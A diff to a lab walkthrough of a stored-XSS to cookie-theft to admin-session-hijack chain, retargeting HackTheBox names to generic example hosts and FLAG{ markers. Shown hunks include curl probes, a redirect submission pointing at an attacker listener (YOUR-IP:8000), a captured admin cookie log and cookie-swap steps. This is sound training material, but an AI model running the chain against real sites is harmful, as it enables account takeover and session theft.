@@ -32,7 +32,7 @@ http://target/submit-solution?url=http://target/profile?email=YOUR_EMAIL
 
 # 5. Browse admin's profile, retrieve flag 1, download PCAP
 
-# 6. Open PCAP in Wireshark, filter http, search for HTB{
+# 6. Open PCAP in Wireshark, filter http, search for FLAG{
 ```
 
 Success indicator: both flags in hand, full attack chain documented with timestamps and screenshots from your listener, your browser, and Wireshark.
@@ -41,14 +41,14 @@ Success indicator: both flags in hand, full attack chain documented with timesta
 
 A bug bounty program. In scope:
 
-- Single target: `http://minilab.htb.net`
+- Single target: `http://minilab.example.net`
 - Client-side attacks against end users are explicitly in scope
 - Test account: `heavycat106` / `rocknrol`
-- Through dirbusting, you've discovered: `http://minilab.htb.net/submit-solution`
+- Through dirbusting, you've discovered: `http://minilab.example.net/submit-solution`
 
 The goal: hijack an admin session, read a flag in the admin's profile, and extract a second flag from a PCAP file linked in that profile.
 
-This is the HTB Session Security skill assessment; the chain is also representative of real engagements where session attacks against high-privilege users are the path to maximum impact.
+This is a representative end-to-end session-attack chain - the kind where session attacks against high-privilege users are the path to maximum impact in a real engagement.
 
 ## Step 0 - Reconnaissance
 
@@ -78,10 +78,10 @@ Edit your profile. In the Country field, paste:
 Save. The form accepts the input. Now browse to the share/public profile view:
 
 ```
-http://minilab.htb.net/profile?email=heavycat@example.com
+http://minilab.example.net/profile?email=heavycat@example.com
 ```
 
-(Replace with your actual email.) The alert fires. The domain shown is `minilab.htb.net` - confirming JavaScript is executing in the target's origin, not a sandbox.
+(Replace with your actual email.) The alert fires. The domain shown is `minilab.example.net` - confirming JavaScript is executing in the target's origin, not a sandbox.
 
 This proves:
 
@@ -125,7 +125,7 @@ Silent - `fetch` makes the request without changing the page. Less suspicious if
 
 If the app sanitizes `<script>` but allows other tags, fall back to Payload A.
 
-Use whichever fires. For this walkthrough I'll use Payload A (it matches the source-doc scenario).
+Use whichever fires. For this walkthrough I'll use Payload A (it's the more broadly-compatible of the two).
 
 ## Step 3 - Stand up the cookie logger
 
@@ -166,7 +166,7 @@ Toggle profile visibility to public (click "Change Visibility" → "Make Public"
 Your public profile URL is now:
 
 ```
-http://minilab.htb.net/profile?email=heavycat@example.com
+http://minilab.example.net/profile?email=heavycat@example.com
 ```
 
 (Or whatever email is on your account.) Test by opening the profile in a private window - the XSS should fire, your listener should receive a hit with your own cookie. Confirms the end-to-end XSS-to-listener chain works before depending on it.
@@ -174,7 +174,7 @@ http://minilab.htb.net/profile?email=heavycat@example.com
 ## Step 5 - Probe `/submit-solution` for open redirect
 
 ```shell
-$ curl -is 'http://minilab.htb.net/submit-solution'
+$ curl -is 'http://minilab.example.net/submit-solution'
 ```
 
 Look at the response. Two outcomes:
@@ -182,10 +182,10 @@ Look at the response. Two outcomes:
 - **Form**: submit-solution is a form-rendering endpoint. View source, find what fields it accepts.
 - **JSON / redirect**: an API endpoint. Test with a query parameter.
 
-The source doc mentions `?url=` as a parameter. Test it:
+This app exposes a `?url=` parameter. Test it:
 
 ```shell
-$ curl -is 'http://minilab.htb.net/submit-solution?url=http://YOUR-IP:8000/' \
+$ curl -is 'http://minilab.example.net/submit-solution?url=http://YOUR-IP:8000/' \
        -b 'auth-session=YOUR_COOKIE'
 ```
 
@@ -204,21 +204,21 @@ The chain you want:
 
 1. Admin visits `/submit-solution`'s review interface
 2. Admin clicks the submitted URL
-3. Admin's browser navigates to your profile (`http://minilab.htb.net/profile?email=YOU`)
+3. Admin's browser navigates to your profile (`http://minilab.example.net/profile?email=YOU`)
 4. Your stored XSS payload fires *in the admin's browser*, with the admin's cookies
 5. The XSS exfils the admin's cookie to your listener
 
 The submission:
 
 ```
-http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=heavycat@example.com
+http://minilab.example.net/submit-solution?url=http://minilab.example.net/profile?email=heavycat@example.com
 ```
 
 Submit this URL via the form (or POST, depending on what `/submit-solution` expects). Now wait.
 
 Notes:
 
-- The URL points to `minilab.htb.net` (same origin) - admin's browser sees a same-origin navigation, no scary warnings, full credential context, your XSS executes as if the admin clicked a normal app link
+- The URL points to `minilab.example.net` (same origin) - admin's browser sees a same-origin navigation, no scary warnings, full credential context, your XSS executes as if the admin clicked a normal app link
 - The cookie that arrives is the *admin's* - because the XSS fires in the admin's browser context
 
 ## Step 7 - Wait for the admin click; capture the cookie
@@ -234,7 +234,7 @@ When the admin reviews the submission:
 ```
 [2024-09-30 14:31:55] 10.10.10.42
   UA: Mozilla/5.0 (Windows NT 10.0; Win64) Firefox/118.0
-  Ref: http://minilab.htb.net/profile?email=heavycat@example.com
+  Ref: http://minilab.example.net/profile?email=heavycat@example.com
   Cookie: auth-session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9.xxx
 ```
 
@@ -249,9 +249,9 @@ auth-session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
 
 ## Step 8 - Hijack the admin session
 
-Open a private/incognito window. Navigate to `http://minilab.htb.net/` - get a login prompt (no session yet). Don't log in. Instead:
+Open a private/incognito window. Navigate to `http://minilab.example.net/` - get a login prompt (no session yet). Don't log in. Instead:
 
-1. F12 → Storage (Firefox) or Application (Chrome) → Cookies → select `minilab.htb.net`
+1. F12 → Storage (Firefox) or Application (Chrome) → Cookies → select `minilab.example.net`
 2. Find `auth-session` (your private window's pre-login cookie if any, or none)
 3. Double-click value, replace with the admin's cookie from your log
 4. Press Enter
@@ -274,7 +274,7 @@ In the hijacked session, browse:
 2. Click "Share" or navigate to `/profile?email=admin@example.com` (or whatever the admin's email is - visible in the admin's profile fields)
 3. Find the flag - typically embedded in the profile description or visible as a button/link
 
-The HTB-style scenario: a "Share" workflow requires the profile to be public. If the admin's profile is private, you may need to first toggle visibility:
+The typical scenario: a "Share" workflow requires the profile to be public. If the admin's profile is private, you may need to first toggle visibility:
 
 1. Click "Change Visibility"
 2. Click "Make Public"
@@ -282,7 +282,7 @@ The HTB-style scenario: a "Share" workflow requires the profile to be public. If
 4. Flag 1 is rendered on the share page
 
 ```
-HTB{flag_one_value_here}
+FLAG{flag_one_value_here}
 ```
 
 ## Step 10 - Download the PCAP
@@ -298,7 +298,7 @@ If the download endpoint requires the admin session (it will), make sure you're 
 ```shell
 $ curl -b 'auth-session=ADMIN_COOKIE' \
        -o flag2.pcap \
-       http://minilab.htb.net/path/to/flag2.pcap
+       http://minilab.example.net/path/to/flag2.pcap
 ```
 
 ## Step 11 - Wireshark the PCAP
@@ -316,24 +316,24 @@ $ tshark -r flag2.pcap -Y http
 Filter for HTTP traffic. Look for distinctive content:
 
 - A GET request with a parameter that contains the flag pattern
-- A response body containing `HTB{...}`
+- A response body containing `FLAG{...}`
 
-The HTB scenario flag is in a GET parameter:
+In this scenario the secret is in a GET parameter:
 
 ```shell
-$ tshark -r flag2.pcap -Y http -T fields -e http.request.uri | grep -i 'HTB{'
-/some/path?token=HTB{flag_two_value_here}
+$ tshark -r flag2.pcap -Y http -T fields -e http.request.uri | grep -i 'FLAG{'
+/some/path?token=FLAG{flag_two_value_here}
 ```
 
 Or in Wireshark GUI:
 
 1. Filter: `http`
-2. Edit → Find Packet → "Packet bytes" → String `HTB{`
+2. Edit → Find Packet → "Packet bytes" → String `FLAG{`
 3. Wireshark highlights the packet containing the flag
 4. Look at the URI or body field in the packet detail
 
 ```
-GET /some/endpoint?secret=HTB{flag_two_value_here} HTTP/1.1
+GET /some/endpoint?secret=FLAG{flag_two_value_here} HTTP/1.1
 ```
 
 Flag 2 captured.
@@ -441,7 +441,7 @@ Step 7 - Flag retrieval
 
 Step 8 - PCAP analysis
   [ ] Wireshark / tshark filter http
-  [ ] Search for HTB{ pattern
+  [ ] Search for FLAG{ pattern
   [ ] Flag 2 captured
 ```
 
@@ -458,5 +458,5 @@ Step 8 - PCAP analysis
 | Submit malicious URL | `?url=http://target/profile?email=YOUR_EMAIL` |
 | Hijack - DevTools swap | F12 → Storage → Cookies → swap auth-session value |
 | Hijack - Burp swap | Match-and-Replace on Cookie header |
-| Flag in PCAP | `tshark -r f.pcap -Y http \| grep 'HTB{'` |
-| Wireshark search | Edit → Find Packet → Packet bytes → String `HTB{` |
+| Flag in PCAP | `tshark -r f.pcap -Y http \| grep 'FLAG{'` |
+| Wireshark search | Edit → Find Packet → Packet bytes → String `FLAG{` |
